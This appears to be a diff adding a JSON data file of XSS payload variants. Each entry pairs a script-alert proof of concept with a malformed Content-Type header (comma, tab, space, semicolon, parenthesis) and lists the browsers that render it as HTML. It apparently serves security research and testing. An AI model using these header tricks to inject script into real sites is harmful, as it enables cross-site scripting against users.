@@ -1,0 +1,61 @@
+[
+    {
+        "description": "Using comma separator",
+        "code": "<script>alert(document.domain)<\/script>",
+        "content-type": "text/plain; x=x, text/html, foobar",
+        "browsers": [
+            "chrome",
+            "firefox"
+        ]
+    },
+    {
+        "description": "Using closing parenthesis",
+        "code": "<script>alert(document.domain)<\/script>",
+        "content-type": "text/html(xxx",
+        "browsers": [
+            "chrome",
+            "firefox"
+        ]
+    },
+    {
+        "description": "Using tab",
+        "code": "<script>alert(document.domain)<\/script>",
+        "content-type": "text/html\u0009xxx",
+        "browsers": [
+            "chrome",
+            "firefox"
+        ]
+    },
+    {
+        "description": "Using space",
+        "code": "<script>alert(document.domain)<\/script>",
+        "content-type": "text/html xxx",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge"
+        ]
+    },
+    {
+        "description": "Using comma",
+        "code": "<script>alert(document.domain)<\/script>",
+        "content-type": "text/html, xxx",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Using semi-colon",
+        "code": "<script>alert(document.domain)<\/script>",
+        "content-type": "text/html; xxx",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    }
+]
